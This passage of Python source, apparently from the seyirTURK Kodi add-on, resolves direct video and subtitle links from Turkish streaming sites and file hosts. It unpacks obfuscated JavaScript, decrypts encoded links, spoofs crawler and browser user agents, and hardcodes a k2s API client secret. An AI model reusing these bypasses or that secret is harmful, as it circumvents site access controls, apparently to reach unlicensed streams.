        ss = re.findall('var\s*scx\s*=\s*(.*?);',page)[0]
    except:
        page = requests.get(url1[0], headers={"User-Agent": "GoogleBot"}).text
        ss = re.findall('var\s*scx\s*=\s*(.*?);',page)[0]
    js =json.loads(ss)
    for key in js:
        provider.append(key)
    if len(provider) > 1:
        selected_provider = select(provider,provider,1)
    else:
        selected_provider =  key
    if url1[1] == "1":
        lang = "tr"
    elif url1[1] == "0":
        lang = "en"
    if '"tr"' not in ss and '"en"' not in ss:
        s = js[selected_provider]["sx"]["t"][0].replace("\\","")
    else:
        s = js[selected_provider]["sx"]["t"][lang].replace("\\","")
    l = ""
    for c in s:
        l = l + findRealChar(c)
    link = decode_base64(l)
    sub_files = []
    if "vidmoly" not in link:
        if "trstx" in link or "sobreatsesuyp" in link:
            return link + "?l=" + url1[1]
        if "trplayer" in link:
            kokk = '/'.join(link.split('/')[:3]) + '/'
            page = fetch(link, head = {"Referer":kok})
            data = json .loads(re.findall('var\s*video\s*=\s*(.*?);', page)[0])
            link = kokk + "m3u8/{}/{}/master.txt?s=1&id={}&cache={}".format(data.get("uid"), data.get("md5"), data.get("id"), data.get("status"))
            return link
        else:
            page = fetch(link, head = {"Referer":kok})
            try:
                subs= re.findall('jwSetup\.tracks\s*= \s*(.*?);',page)[0]
                if len(subs) > 0:
                    subjs = json.loads(subs)
                    for j in subjs:
                        if "captions" in j["kind"]:
                            sub_files.append(j["file"])
            except:
                pass
    link = re.findall('"file":\s*av\(\'(.*?)\'\),', page)[0]
    link = decryptFor4KIzle(link)
    return [link + "#Origin=https://rapidvid.net" ,sub_files]

def koreanturk(url):
    page= fetch(url, head={'Referer': url})
    part = re.findall('tab-content icerikler(.*?)text/css', page, re.DOTALL)[0]
    embeds = re.findall('id="(.*?)".*?(?:iframe.*?src|a.*?href)="(.*?)"', part)
    linklist = []
    providerlist = []
    for embed in embeds:
        if "vk.com" in embed[1] or "ok.ru" in embed[1] or "vidmoly.me" in embed[1] or "fembed.com" in embed[1] or "videobin.co" in embed[1] or "gounlimited.to" in embed[1] or "vidmoly.me" in embed[1] or "dailymotion" in embed[1] :
            embedus = embed[1]
            if 'dailymotion' in embed[1]:
                embedus = 'https:' + re.findall('^(.*?)\?', embed[1])[0]
            if 'vidmoly' in embed[1]:
                embedus = 'https:' + embed[1]
            linklist.append(embedus)
            providerlist.append(embed[0])
    return select(providerlist,linklist,1)

def extract_function(page, fname):
    start = page.find(f"function {fname}")
    if start == -1:
        return None

    brace_count = 0
    in_func = False
    result = ""

    for i in range(start, len(page)):
        char = page[i]

        if char == "{":
            brace_count += 1
            in_func = True

        if in_func:
            result += char

        if char == "}":
            brace_count -= 1
            if brace_count == 0 and in_func:
                break
    return "function test(value_parts)" + result[result.find("{"):]

def filmmakinesi(url):
    subs =[]
    lang = re.findall('\?l=(\d)$',url)[0]
    kok = '/'.join(url.split('/')[:3]) + '/'
    url = url.split('?')[0]
    page = fetch(url, head={'User-Agent': UA, 'Accept': '*/*', 'Referer': url})
    try:
        link = re.findall('(https://closeload.filmmakinesi.*?/embed/.*?/)', page)[0]
    except:
        # sobreatsesuyp
        link = re. findall('iframe.*?data-src="(.*?)"', page)[0]
        if not "rapid." in link:
            link = link + "?l=" + lang
            return link
    page = fetch(link, head={'User-Agent': UA, 'Accept': '*/*', "Referer": kok}).replace("\n","").replace("\t","")
    subs = re.findall('"file":"([^\"]+tur.vtt)"', page)
    for sub in subs:
        if "forced" not in sub:
            selected_sub = sub
    sub = selected_sub.replace('\\/','/') if sub.startswith("http") else kok[:-1] + selected_sub.replace('\\/','/')
    sub_page = fetch(sub, head={"User-Agent": "PostmanRuntime/7.53.0"})
    subs =[fixsub(sub_page, site="contentx")]
    js_eval = re.findall(r"eval\(function\(p,a,c,k,e,d\)\{.*?\}\)\)", page, re.DOTALL)
    detect(js_eval[0])
    page1 = unpack(js_eval[0])
    try:
        f_name = re.findall("function\s*(dc_.*?)\(value_parts\)",page1)[0]
    except:
        f_name = re.findall("function\s*(dc_.*?)\(value_parts\)",page)[0]
    fun = extract_function(page, f_name)
    fun = fun.encode('ascii', errors='ignore').decode('ascii').replace("// paralar birletir","")
    fun = re.sub(r'//[^l]*(?=let)', '', fun)
    regexString = "=\\s*" + f_name + "\\((.*?)\\)"
    data_ = re.findall(regexString, page)
    payload = {"js_function": fun, "data": json.loads(data_[0])}
    response = requests.post(decode_base64(hash_), json=payload)
    match = json.loads(response.text)
    return [match["result"] + "#Referer=" + kok.replace("https://", "https://closeload.") + "&User-Agent=" + UA, subs]

def ugurfilm(url):
    kok = '/'.join(url.split('/')[:3]) + '/'
    c = fetch(url)
    links = re.findall('<a\s*class="partsec"\s*href="(.*?)"', c)
    if len(links) > 1:
        for i, link in enumerate(links):
            kaynaklar.append("Bölüm " + str(i+1))
            linkler.append(link)
        link = select(kaynaklar, linkler,1)
        c = fetch(link)  
        kaynaklar.clear()
        linkler.clear()   
    try:
        player = kok + 'player' + re.findall('<iframe.*?src="' + kok + 'player(.*?)"', c)[0]
        if kok + 'player/play.php' in player :
            vid_id = player.split("=")[-1:][0]
            d = fetch(player, head={'Referer': player})
            embedsz = re.findall('class="c-dropdown__item"\s*data-dropdown-value="(.*?)" data-order-value="(\d+)"',d)
            for embed in embedsz:
                embeds_url = kok + "player/ajax_sources.php"
                values = {"vid" : vid_id,"alternative" : embed[0],"ord" : embed[1] }
                headers = {"Referer": kok, "X-Requested-With": "XMLHttpRequest"}
                the_page = fetch(embeds_url, data=values, head=headers)
                try:
                    embed_link = re.findall('"iframe":"(.*?)"',the_page)[0].replace('\/','/')
                    if not 'http' in embed_link:
                        embed_link = 'https:' + embed_link
                    provider = re.findall('(?:\/\/www|\/\/)(.*?)\.',embed_link)[0].capitalize()
                    if 'mail' in embed_link:
                        kaynaklar.append('Mailru')
                        linkler.append(embed_link)
                    elif 'fembed' in embed_link:
                        kaynaklar.append('Fembed')
                        linkler.append(embed_link)
                    elif 'vidmoly' in embed_link:
                        kaynaklar.append('Vidmoly')
                        linkler.append(embed_link)
                    elif 'ok.ru' in embed_link:
                        linkler.append(embed_link)
                        kaynaklar.append('Odk')
                    elif 'odnoklassniki' in embed_link:
                        kaynaklar.append('Odk')
                        linkler.append(embed_link)
                    elif 'youtube' in embed_link:
                        kaynaklar.append('Youtube')
                        linkler.append(embed_link)
                except:
                    pass
        else:
            try:
                partial = re.findall('parttab tab-aktif(.*?)</iframe>',c, re.DOTALL)
                embedler = re.findall('href="(.*?)"',partial[0])
                for e in embedler:
                    h = fetch(e)
                    embed_link = re.findall("iframe.*?src=(?:'|\")(.*?)(?:'|\")",h)[0]
                    if not 'http' in embed_link:
                        embed_link = 'https:' + embed_link
                    
                    provider = re.findall('(?:\/\/www|\/\/)(.*?)\.',embed_link)[0].capitalize()
                    if 'mail' in embed_link:
                        kaynaklar.append('Mailru')
                        linkler.append(embed_link)
                    elif 'fembed' in embed_link:
                        kaynaklar.append('Fembed')
                        linkler.append(embed_link)
                    elif 'vidmoly' in embed_link:
                        kaynaklar.append('Vidmoly')
                        linkler.append(embed_link)
                    elif 'ok.ru' in embed_link:
                        kaynaklar.append('Odk')
                        linkler.append(embed_link)
                    elif 'odnoklassniki' in embed_link:
                        kaynaklar.append('Odk')
                        linkler.append(embed_link)
                    elif 'youtube' in embed_link:
                        kaynaklar.append('Youtube')
                        linkler.append(embed_link)
            except:
                embed_link = re.findall('iframe.*?src="(.*?)"',c)[0]
                if 'youtube' in embed_link:
                    kaynaklar.append('Youtube')
                    linkler.append(embed_link)
    except:
        try:
            player = re.findall('<iframe.*?src="(.*?)"', c)[1]
            if "trstx" in player or "sobreatsesuyp" in player:
                lang = select(["Altyazılı", "Turkçe"], ["0","1"])
                return player + "?l=" + lang
        except:
            link = re.findall('<iframe.*?src="(.*?)"', c)[0]
            return link + "?l=44"
        kod = re.findall("movie/(.*?)/iframe", player)[0]
        for i in range(1,3):
            if  i == 1:
                d = fetch(player + "?t=" + kod)
                kaynaklar.append("Altyazılı")
            else:
                d = fetch(player)
                kaynaklar.append("Dublaj")                
            link = re.findall('"hls":"(.*?)"', d)[0]
            link = "https:" + link.replace('\/','/')
            linkler.append(link)
    if len(kaynaklar) > 1:
        return select(kaynaklar,linkler,1)
    else:
        return linkler[0]

def get_embed_url_hdfilmcehennemi(url):
    page = fetch(url, head={'Referer': url})
    kok = '/'.join(url.split('/')[:3]) + '/'
    try:
        embed = ''
        embed_64 = re.findall("<script>var.*?'(.*?)'",page)[0]
        embed_decoded = decode_base64(embed_64).lower()
        embed_hdfilm = re.findall('iframe.*?src\s*=\s*(?:"|\')(.*?)(?:"|\')',embed_decoded)[0]
        if 'moly' in embed_hdfilm:
            if 'watch.php' in embed_hdfilm:
                embed = 'https://vidmoly.to/embed-' + embed_hdfilm.replace(kok + 'watch.php?v=v/','') + '.html'
            else:
                if 'https:' not in embed_hdfilm:
                    embed = 'https:' + embed_hdfilm
        elif 'odnok' in embed_hdfilm or 'ok.ru' in embed_hdfilm:
            if 'watch.php' in embed_hdfilm:
                embed = 'https://odnoklassniki.ru/videoembed/' + embed_hdfilm.replace(kok + 'watch.php?v=ok/','')
            else:
                if 'https:' not in embed_hdfilm:
                    embed = 'https:' + embed_hdfilm
        elif 'up' in embed_hdfilm:
            if 'watch.php' in embed_hdfilm:
                embed = 'https://uptostream.com/iframe/' + embed_hdfilm.replace(kok + 'watch.php?v=up/','')
            else:
                if 'https:' not in embed_hdfilm:
                    embed = 'https:' + embed_hdfilm
        elif 'fembed' in embed_hdfilm:
            if 'watch.php' in embed_hdfilm:
                embed = 'https://www.fembed.net/v/' + embed_hdfilm.replace(kok + 'watch.php?v=fembed/','')
            else:
                if 'https:' not in embed_hdfilm:
                    embed = 'https:' + embed_hdfilm        
    except:
        embed = re.findall('iframe.*?src\s*=\s*(?:"|\')(.*?)(?:"|\')',page)[0]
        if 'fembed' in embed:
            embed = 'https:' + embed
        elif "ashortl" in embed:
            page = fetch(embed)
            embed = re.findall('iframe.*?src\s*=\s*(?:"|\')(.*?)(?:"|\')',page)[0]

    return embed

def hdfilmcehennemi(url):
    def redir(url):
        r = requests.get(url, allow_redirects=True, headers = {"User-Agent": UA})
        return r.url
    lang = re.findall('\?l=(\d)$',url)[0]
    url = url.split('?')[0]
    page = fetch(url, head={'Referer': url})
    try:
        if lang == "1":
            partial = re.findall('videostr(.*?)</nav', page, re.DOTALL)[0]
        else:
            partial = re.findall('videosen(.*?)</nav', page, re.DOTALL)[0]
    except:
        partial = page
    alternatives = re.findall('nav-link\s*px-3\s*py-1.*?"\s*href="(.*?)"', partial)
    for alt in alternatives:
        embed_link = get_embed_url_hdfilmcehennemi(alt)
        try:
            provider = re.findall('(?:\/\/www.|\/\/)(.*?)\.',embed_link)[0].capitalize()
        except:
            provider = 'boncuk'
        if 'Odnoklassniki' in provider:
            provider = 'ODK'
        if 'My' in provider:
            provider = 'Mailru'
        if 'Uptostream' in provider:
            provider = 'Upto'
        if 'outube' not in provider and 'oncuk' not in provider and 'pto' not in provider:
            linkler.append(embed_link)
            kaynaklar.append(provider)
    if len(linkler) > 1:
        link = select(kaynaklar,linkler)
    else:
        link = linkler[0]
    if "fasturl" in link:
        link = link.replace("fasturl.ga","vidmoly.to")
    elif "vidload" in link:
        link = normalize_url(link)
        page = requests.get(redir(link), headers= {"User-Agent": UA, "Referer": baseUrl(link)}).text
        link = baseUrl(link) + re.findall("file\s*:\s*'(.*?)'", page)[0]
        try:
            subs = re.findall("file: \s*'(/uploads.*?)',\s*label", page)
            subs = [redir(baseUrl(link) + m + "#User-Agent=" + UA + "&Referer=" + baseUrl(link)) for m in subs]
        except:
            subs = []
        link = redir(link) + "#User-Agent=" + UA + "&Referer=" + baseUrl(link)
        return [link, subs]    
    return link  
    
def webteizle(url):
    url_raw = url.split("?l=")
    url = url_raw[0]
    try:
        lang = url_raw[1]
    except:
        lang = "0"
    kok = '/'.join(url.split('/')[:3]) + '/'
    ajax_urls_page = fetch(kok + 'js/site.min.js')
    ajax_dataEmb = re.findall('#embed"\)\.addClass\(".*?loading"\),\$\.post\("\/(.*?)"', ajax_urls_page)[0]
    ajax_dataAlt = re.findall('t,n\)\{\$.post\("\/(.*?)"', ajax_urls_page)[0]

    page = fetch(url)
    wip  = re.findall("data-id=\"(.*?)\"", page)[0]
    if '1' in lang:
        dub = 0
    elif '0' in lang:
        dub = 1
    if 'sezon' not in url and 'bolum' not in url: 
        values = {'filmid' : wip, 'dil' : dub, "bot": "0"}
    else:
        sez_bol = re.findall('(\d*)-sezon-(\d*)-', url)
        values = {'filmid' : wip, 'dil' : dub, 's': sez_bol[0][0], 'b': sez_bol[0][1], "bot": 0}
    page = requests.post(kok + ajax_dataAlt, data=values, headers = {"Referer": url, "X-Requested-With": "XMLHttpRequest", "content-type":"application/x-www-form-urlencoded; charset=UTF-8"}).text
    dub_json = json.loads(page)
    links = []
    embeds = []
    for embed in dub_json["data"]:
        values = {'id': embed["id"]}
        emb_content = fetch(kok  + ajax_dataEmb, data=values, head = {"Referer": url})
        if 'bir yerde bulamad' in emb_content:
            showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR red][B]Bu link kaynak sitede silinmiş![/B][/COLOR]")
            return
        try:
            emb_lin = re.findall('/player/video.asp\?v=(.*?)"',emb_content)[0]
            if "qiwi" in emb_lin:
                prov = "Qiwi"
                embeds.append(prov)
                links.append(emb_lin)
        except:
            try:
                prov = re.findall("<script>(.*?)\('.*?',.*?\);</script>", emb_content, re.DOTALL)[0]
                emb_lin = re.findall("<script>.*?\('(.*?)',.*?\);</script>", emb_content, re.DOTALL)[0]
            except:
                continue
        if prov == "sper":
            embeds.append("Super")
            links.append("https://supervideo.tv/e/"+emb_lin)
        elif prov == "fembed":
            embeds.append("fembed")
            links.append("https://www.fembed.net/v/"+emb_lin)
        elif prov == "vidmoly":
            embeds.append("VidMoly")
            links.append("https://vidmoly.to/embed-"+emb_lin+".html")
        elif prov == "mailru":
            embeds.append("mailru")
            var = emb_lin.split("/")
            links.append("https://my.mail.ru/"+var[0]+"/"+var[1]+"/video/embed/"+var[2]+"/"+var[3])
        elif prov == "okru":
            embeds.append("ODK")
            links.append("https://ok.ru/videoembed/"+emb_lin)
        elif prov == "streamlare":
            embeds.append("Streamlare")
            links.append("https://streamlare.com/e/"+emb_lin)
        elif prov == "streamsb":
            embeds.append("StreamSB")
            links.append("https://streamsb.net/e/"+emb_lin+".html")
        elif prov == "filemoon":
            embeds.append("FileMoon")
            links.append("https://filemoon.sx/e/" + emb_lin) 
    if len(links)>1:
        return select(embeds,links,1)
    if len(links) == 1:
        return links[0]

def yilmaztv(url):
    return url + '#Referer=https://www.yilmaztv.com&User-Agent=' + UA
        
def k2s(url):
    api_base = 'https://api.k2s.cc/v1'
    headers = {'Referer': url,
               'Origin': 'https://k2s.cc'}
    data = {"grant_type": "client_credentials",
            "client_id": "k2s_web_app",
            "client_secret": "pjc8pyZv7vhscexepFNzmu4P"}
    code = url.split('/')[4]
    page = fetch(api_base + '/auth/token', data=data, head=headers)
    access_token = json.loads(page).get('access_token')
    headers = {'Referer': url,
               'Origin': 'https://k2s.cc',
               'Authorization': 'Bearer '+access_token}
    page = fetch(api_base + '/files/' + code  + '?embed=permanentAbuse',head=headers)
    link = json.loads(page).get('videoPreview').get('video')
    headers.pop('Authorization')
    return link

def vcdn(url):
    code = url.split('/')[4]
    url = 'https://vcdn.io/api/source/' + code
    values = {"d": "vcdn.io",
              "r":""}
    page = fetch(url, data=values, head= {"Referer": url})
    values = re.findall('"file":"(.*?)","label":"(.*?)"',page.replace('\\',''))
    for value in values:
        qualitylist.append(value[1])
        videolist.append(value[0])
    return  select(qualitylist,videolist)

def cloudvideo(url):
        page = fetch(url)
        js_eval = re.findall('ipt">(eval.*?)\n',page)
        detect(js_eval[0])
        page = unpack(js_eval[0])
        return re.findall('src:"(.*?)"',page)[0]


def jetfilmizle(url):
    url_raw = url.split("?l=")
    url = url_raw[0]
    lang = url_raw[1]
    page = fetch(url)
    referer = '/'.join(url.split('/')[:3]) + '/'
    partial = re.findall('film_part(.*?)(?:pbgiris|iframe)',page, re.DOTALL)[0] 
    alt_names = re.findall('<span>(.*?)</span>',partial)
    alt_links = re.findall('href="(.*?)"',partial)
    alt_links.insert(0,url)
    remo = ["Vip", "JET","Vupload","Letsupload","JetPlay","Mail",
            "Aparat","Vidmoly","MixPlay","Jetv.xyz",
            "Platin","Moly","OkRu","Okru","Dood","VK",
            "YX","TRP","SEG","One","TR-EN"]
    for rem in remo:
        try:
            index = alt_names.index(rem)
            kaynaklar.append(alt_names[index])
            linkler.append(alt_links[index])
        except:
            pass
    if len(kaynaklar)>0:
        url = select(kaynaklar, linkler, 1)
    else:
        showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","Oynatılabilecek kaynak bulunamadı!")
        return None
    if url is not None and url != 'selection cancelled':
        page = fetch(url)
        try:
            url = re.findall("<iframe.*?data-(?:litespeed|)src=['\"](.*?)['\"]\s*(?:width|frame|)",page)[0]
        except:
            try:
                url = re.findall("<iframe src=['\"](.*?)['\"].*?allowfullscreen",page)[0]
            except:
                url = re.findall("<iframe.*?data(?:-litespeed-|)src=['\"](.*?)['\"]\s*(?:width|frame|)",page)[0]
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                                'Accept': 'application/json, text/javascript, */*; q=0.01',
                                'Accept-Language': 'tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3',
                                'Connection': 'keep-alive',
                                'Referer': referer,
                                'X-Requested-With': 'XMLHttpRequest'}
        if "trstx" in url or "sobreatsesuyp" in url or "zupeo" in url:
            return url + "?l=" + lang
        if "ply.jetfilmizle" in url:
            page = requests.get(url, headers = {"Referer": referer}).text
            ct =  Quote(re.findall('"ct":"(.*?)"', page)[0])
            iv =  Quote(re.findall('"iv":"(.*?)"', page)[0])
            s =  Quote(re.findall('"s":"(.*?)"', page)[0])
            page = fetch(root2 + "/v2/jetfilmizle_tren.php", head = {"Accept": "*/*", "User-Agent": UA}, data = {"ct": ct, "iv": iv, "s": s})
            link = re.findall('"file":"(.*?)"', page)[0] + "#Referer=" + referer
            try:
                subs = re.findall('(https[^"]+\.srt)","label":"Turk', page)
                return [link, subs]
            except:
                return link
        if "jetv.xyz/dz" in url:
            page = fetch(url, head ={"Referer": referer, "UserAgent": UA})
            d = {}
            d["iv"] = "987654jetfilmcom"
            d["s"] = "987654321jetfilm"
            d["ct"] = re.findall('jetESources\s*=\s*"(.*?)";', page)[0]
            h = Quote(json.dumps(d))
            link = requests.post(root + "v2/parser/aes.php", data = "v1=" + "&" + "v2=" + h, headers={'User-Agent': UA, 'bety': 'jughead', 'X-Requested-With': 'XMLHttpRequest'}).text.replace("\\","")
            link = "/".join(link.split("/")[:-1]) + re.findall('\n(.*)$', requests.get(link).text)[-1]
            return link + "#User-Agent=" + UA + "&Referer=https://jetv.xyz/"
        if "jetv.xyz/yx" in url:
            code = re.findall('id=(.*?)$', url)[0]
            page = requests.post("https://jetv.xyz/yx/api.php", data = {"vars": code}, headers = headers).text
            try:
                link = re.findall('"file":"(.*?)",',page)[0].replace("\\",'')
            except:
                link = re.findall('"file":"(.*?)",',page, re.DOTALL)[-1].replace("\\",'')
            return link
        if "jtfi" in url:
            uaa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
            page = requests.get(url, headers ={"Referer": referer, "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"}).text
            try:
                link = re.findall('"hls","file":"(.*?)"', page)[0].replace("\/","/") + "#UserAgent=" + uaa
            except:
                link = re.findall('"file":"(.*?)"', page)[-1].replace("\/","/") + "#UserAgent=" + uaa
            return link
        if 'mixdrop' in url or 'videobin' in url or 'upstream' in url or 'vidmoly' in url or 'ok.ru' in url or "odnoklassniki" in url or "dood" in url:
            return normalize_url(url)
        if "letsupload" in url:   
            page = fetch(url, head=headers)
            link = re.findall('mp4HD:\s*"(.*?)"', page)[0]
            return link
        if 'aparat.cam' in url or "vupload" in url:  
            page = fetch(url, head=headers)
            link = re.findall('src: "(.*?)"',page)
            return link[0]
        if "segavid.com" in url or "oneupload" in url:
            page = fetch(url, head ={"Referer": referer, "UserAgent": UA})
            link = re.findall('file:"(.*?)"', page)[0]
            return link       
        if 'gp.jetcdn' in url or ('jetv.xyz' in url and "/yx" not in url) or 'yjco.xyz' in url or "jetfilmvid" in url:
            page = fetch(normalize_url(url), head=headers)
            page = page.replace("\\","")    
            if '"label":"' in page:
                for match in re.finditer('"label":"([^"]+)","type":"[^"]+","file":"([^"]+)"', page):
                    qualitylist.append(match.group(1))
                    videolist.append(match.group(2))
                return auto_select(qualitylist,videolist)
            elif "Contents =" in page:
                return vectorx(url)
            elif 'm3u8' in page:
                son_url = re.findall('"?file"? ?: ?"([^"]+)"', page, re.IGNORECASE)[0]
                return son_url
            elif "src=" in page:
                partial = re.findall('<iframe(.*?)</iframe', page, re.IGNORECASE)[0]
                url_son = normalize_url(re.findall('src=["\'](.*?)["\']', partial, re.IGNORECASE)[0])
                if "fjetvid.com" not in url_son:
                    return url_son
                else:
                    values = {"d": "fjetvid.com","r":"https://jetv.xyz/"}
                    url_son = url_son.replace("/v/","/api/source/")
                    page = fetch(url_son, data=values, head= {"Referer": url})
                    values = re.findall('"file":"(.*?)","label":"(.*?)"',page.replace('\\',''))
                    for value in values:
                        qualitylist.append(value[1])
                        videolist.append(value[0])
                    return  auto_select(qualitylist,videolist)
            else:
                for match in re.finditer('"?file"? ?: ?"([^"]+)", ?"(?:type|label)": ?"([^"]+)"', page):
                    qualitylist.append(match.group(2))
                    videolist.append(match.group(1))
                if len(qualitylist) > 1:
                    return auto_select(qualitylist,videolist)
                elif len(qualitylist) == 1:
                    return videolist[0]
                else:
                    error(url)
        if "jfvid" in url:
            return url.replace("/play/","/stream/")
    else:
        return 'selection cancelled'

def plus4(url):
    if url.startswith('/player/'):
        url = 'https://sezonlukdizi8.com' + url
    page = fetch(url, head={"Referer":url})
    videolist = re.findall('"file":"(.*?)"', page)
    qualitylist = re.findall('"label":"(.*?)"', page)
    res = select(qualitylist, videolist)
    if res is not None and res != 'selection cancelled':
        return res + "#Referer=https://sezonlukdizi8.com"
    elif res == 'selection cancelled':
        return res
    
def upstream(url):
    page = requests.get(url, headers ={"Referer": "https://sezonlukdizi8.com/", "User-Agent": UA}).text
    try:
        evall = re.findall("text/javascript.*?\s*(eval.*?)</sc", page, re.DOTALL)[0].strip()
    except:
        try:
            iframe = re.findall('<iframe\s*src="(.*?)"', page)[0]
            page = requests.get(iframe, headers={"User-Agent": UA, "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7", "sec-fetch-dest": "iframe"}).text
            evall = re.findall("text/javascript.*?(eval.*?)</script", page, re.DOTALL)[0].strip()
        except:
            page = fetch(url, head ={"Referer": url})
            evall = re.findall("text/javascript.*?(eval.*?)</script", page, re.DOTALL)[0].strip()
        
    detect(evall)
    d = unpack(evall)
    try:
        link = re.findall('file:"(.*?m3u8)"', d)[0]
    except:
        link = re.findall('file:"(.*?)"', d)[0]
    return link + "#User-Agent=" + UA

def videoseyred(url):
    page = requests.get(url).text
    kod = re.findall('\'/playlist/(.*?)\.json\';',page)[0]
    url = "https://videoseyred.in/playlist/" + kod + ".json"
    page = fetch(url)
    jpage = json.loads(page)
    link = jpage[0]["sources"][0]["file"]
    sub = ''
    for j in jpage[0]["tracks"]:
        if "label" in j:
            if 'T' in j["label"]:
                sub = j["file"]
    sonek = '#Referer=' + url + '&User-Agent=' + UA
    if sub == "":
        return link 
    else:
        return [link , [sub]]

def sezonlukdizi(url):
    kok = '/'.join(url.split('/')[:3]) + '/'
    alt_names = []
    alt_ids = []
    url_lang = url.split('?l=')
    url = url_lang[0]
    lang = url_lang[1]
    if lang == "0":
        dil = "1"
    else:
        dil ="0"
    page = fetch(url)
    bid = re.findall('<div\s*bid="(\d*)"\s*did=', page)[0]
    ajax_page = fetch(kok + 'ajax/dataAlternatif22.asp', data = {"bid": bid, "dil": dil}, head = {"Referer": url, "X-Requested-With": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8"})
    if 'eklenmedi' not in ajax_page:
        if not isPy3:
            jso = json.loads(ajax_page.decode('UTF-8','ignore'))
        else:
            jso = json.loads(ajax_page.replace('Ý','İ'))
        for js in jso["data"]:
            if not isPy3:
                alt_names.append(js["baslik"].replace('ngilizce', 'İngilizce'))
            else:
                 alt_names.append(js["baslik"].title())
            alt_ids.append(js["id"])  
        remo = ["Netu","Multi","Uptobox"]
        for rem in remo:
            try:
                alt_names.pop(alt_names.index(rem))
                alt_ids.pop(alt_names.index(rem))
            except:
                pass
        res = select(alt_names, alt_ids, 1)
        if res is not None and res != 'selection cancelled':
            page = fetch(kok + 'ajax/dataEmbed22.asp', data={"id": res})
            link = normalize_url(re.findall('(?:SRC|src)="(.*?)"', page)[0])
            if '/player/fembed.asp' in link:
                code = link.split('?v=')[1]
                link = 'https://dutrag.com/v/' + code
            elif "playerjs" in link:
                media_id = link.split("/")[4].split("&v=")[1]
                link = bytes(media_id, "utf-8").decode("unicode_escape").encode().decode('utf-8')
                page = requests.get(link, headers={"User-Agent": UA}).text
                link = link.replace("master.m3u8", re.findall(r'\n(.*)$', page, re.MULTILINE)[-1])
            return link
        else:
            return res
    else:
        error(url)

def tele1(url):
    page = fetch(url)
    return re.findall('iframe.*?src="(.*?)"',page)[0]

def ulketv(url):
    page = fetch(url)
    return re.findall('xt/html"\s*src="(.*?)\?', page)[0]

def tvnet(url):
    page = fetch(url)
    return re.findall('<source src="(.*?)"', page)[0]

def decryptFor4KIzle(input_str):
    reversed_str = input_str[::-1]
    first_decoded = base64.b64decode(reversed_str).decode('utf-8')

    result = ""
    key = "K9L"

    for i in range(len(first_decoded)):
        key_char = key[i % len(key)]
        shift = ord(key_char) % 5 + 1
        original_char_code = ord(first_decoded[i]) - shift
        result += chr(original_char_code)

    final_decoded = base64.b64decode(result).decode('utf-8')
    return final_decoded

def k4filmizle(url):
    base_url, _, lang = url.partition("?l=")
    page = fetch(url)
    iframe = re.findall('iframe.*?src="(.*?)"', page)[0]
    file_page = fetch(iframe)
    json1 = re.findall('jwSetup.sources\s*=(.*?);', file_page, re.DOTALL)[0]
    file = re.findall('"file":.*?\(\'(.*?)\'', json1)[0].replace('\\x','')
    movie_url = decryptFor4KIzle(file)
    json2 =  re.findall('jwSetup.tracks\s*=(.*?);', file_page, re.DOTALL)[0].replace('\\','')
    subtitles = re.findall('"captions","file"\s*:\s*"(.*?vtt)"', json2)
    return [movie_url , subtitles] if lang == "1" else movie_url

def dizitime(url):
    kok = '/'.join(url.split('/')[:-2]) + '/'
    page = requests.get(url, headers ={"User-Agent":UA})
    if page.status_code == 200 and len(page.text) > 20:
        page = page.text
    else:
        page = requests.get(url, headers ={"User-Agent":UA})
        if page.status_code == 200  and len(page.text) > 20:
            page = page.text   
        else:
            page = fetch(url, head ={"Referer": url})
    if page.strip() == "":
        page = requests.get("https://webcache.googleusercontent.com/search?q=cache:" + url).text
    oids = re.findall('data-name="(.*?)"\s*data-oid="(.*?)"', page)
    for i,oid in enumerate(oids):
        if 'Moly'in oid[0]:
            kaynaklar.append(str(i) + "- " + oid[0])
            linkler.append(oid[1])
    if len(kaynaklar) > 1:
        code = select(kaynaklar, linkler, 1)
        if "selecetion cancelled" in code:
            return code
    elif len(kaynaklar) == 1:
        return linkler[0]
    else:
        showMessage(2, "Kodide oynatılabilecek kaynak bulunamadı.")
    url = kok + "getvideo/" + code + "_t"
    page = requests.get(url, headers={"Referer": url}, allow_redirects=False)
    link = page.headers["Location"]
    return link

def pandamovie_freeomovie(url):
    page = fetch(url)
    hosts_partial = re.findall('<h3>Watch Online(.*?<h3>)Download', page, re.DOTALL)[0]
    hosts = re.findall('\s+on\s*(.*?)"\s*href="(.*?)"', hosts_partial)
    res = ["videobin","streamtape","doodstream","voe","mixdrop","streamsb","streamz"]
    for host in hosts:
        if host[0].strip().lower() in res:
            kaynaklar.append(host[0].strip())
            linkler.append(host[1])
    if len(kaynaklar) > 1:
        return select(kaynaklar, linkler, 1)
    else:
        showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR yellow][B]Bu filmde desteklenen bir link maalesef yok.[/B][/COLOR]")        

def voe(url):
    page = requests.get(url.replace("https://voe.sx", "https://jessicaglassauthor.com")).text
    try:
        link = re.findall('"Node",\s*"(.*?)"', page)[0]
    except:
        link = decode_base64(re.findall("'hls'\s*:\s*'(.*?)'", page)[0])
    return link

def dood(url):
    url = url.replace(".so", ".yt")
    url.replace("dooood.com","dood.la")
    if ver() > 18:
        kok = '/'.join(url.split('/')[:3])
        page = fetch(url)
        match = re.findall(r'''dsplayer\.hotkeys[^']+'([^']+).+?function\s*makePlay.+?return[^?]+([^"]+)''', page, re.DOTALL)
        rurl = kok + match[0][0]
        link = fetch(rurl, head={"Referer": kok})
        t = string.ascii_letters + string.digits
        return link + ''.join([random.choice(t) for _ in range(10)]) + match[0][1] + str(int(time.time() * 1000)) + "#Referer=" + kok + "&User-Agent=" + UA
    else:
        showMessage("[COLOR orange][B]seyirTURK[/B][/COLOR]","[COLOR yellow][B]Kodi sürümünüz bu linki desteklemiyor, Kodi 19 veya üzeri olması gerekir.[/B][/COLOR]")

def mixdrop(url):
    headers = {'Referer': url, 'User-Agent': UA}
    last = ""
    if "mixdrop" in url:
